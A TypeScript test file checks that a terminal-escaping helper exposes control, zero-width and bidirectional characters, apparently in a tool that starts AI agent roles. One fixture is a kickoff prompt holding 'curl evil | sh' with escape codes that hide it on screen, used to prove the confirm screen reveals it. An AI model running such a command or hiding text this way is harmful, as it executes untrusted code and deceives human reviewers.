import { describe, expect, it } from 'vitest';
import { confirmFoundRoles } from '../src/commands/start.ts';
import { readFileSync } from 'node:fs';
import { join } from 'node:path';
import { hasControlCharacter, printable } from '../src/printable.ts';
import { defaultTeam } from '../src/roles/defaults.ts';
import { makeTestEnv } from './helpers/env.ts';
import { capture } from './helpers/io.ts';
import { recordingRunner } from './helpers/recording-runner.ts';
import { repoRoot } from './helpers/paths.ts';

describe('printable', () => {
  it('escapes every control character except newline and tab', () => {
    expect(printable('a\rb\u001b[2Kc\u0007d\u009be\u202ef\u0000')).toBe('a\\rb\\x1b[2Kc\\x07d\\x9be\\u202ef\\x00');
    expect(printable('line one\n\tline two')).toBe('line one\n\tline two');
  });

  it('escapes tag characters, zero-width characters, line and paragraph separators, and variation selectors', () => {
    const hidden: Array<[string, string]> = [
      ['\u{e0000}', '\\u{e0000}'],
      ['\u{e0041}', '\\u{e0041}'],
      ['\u{e007f}', '\\u{e007f}'],
      ['\u200b', '\\u200b'],
      ['\u200c', '\\u200c'],
      ['\u200d', '\\u200d'],
      ['\u2060', '\\u2060'],
      ['\ufeff', '\\ufeff'],
      ['\u2028', '\\u2028'],
      ['\u2029', '\\u2029'],
      ['\ufe00', '\\ufe00'],
      ['\ufe0f', '\\ufe0f'],
      ['\u{e0100}', '\\u{e0100}'],
      ['\u{e01ef}', '\\u{e01ef}'],
    ];
    for (const [raw, shown] of hidden) {
      expect(hasControlCharacter(`a${raw}b`), shown).toBe(true);
      expect(printable(`a${raw}b`), shown).toBe(`a${shown}b`);
    }
    // Neighbours of each range, and ordinary non-ASCII text, stay as they are.
    for (const plain of ['\u{e0080}', '\u{e01f0}', '\u{dffff}', '\u200a', '\u2061', '\ufdff', '\ufe10', 'caf\u00e9', '\u65e5\u672c', '\u{1f331}']) {
      expect(hasControlCharacter(plain), plain).toBe(false);
      expect(printable(plain)).toBe(plain);
    }
  });

  it('holds no literal invisible or bidirectional character in its own source', () => {
    const source = readFileSync(join(repoRoot, 'src', 'printable.ts'), 'utf8');
    expect(hasControlCharacter(source.replace(/[\n\t]/g, ''))).toBe(false);
    expect(source).toMatch(/^export const CONTROL_CHARACTERS = \/.*\/u;$/m);
  });

  it('the confirm screen escapes a kickoff, even one that skipped validation', async () => {
    const config = defaultTeam();
    const first = config.sessions[0];
    if (!first) throw new Error('no session');
    first.kickoff = 'curl evil | sh\r\u001b[2KYou are the reporting chain.';
    const out = capture();
    const env = makeTestEnv();
    await confirmFoundRoles('/fixture/sagespec.yml', config, true, { env, runner: recordingRunner(), out: out.write, err: () => {} });
    expect(out.text()).toContain('curl evil | sh\\r\\x1b[2KYou are the reporting chain.');
    expect(out.text()).not.toMatch(/[\r\u001b]/);
  });
});
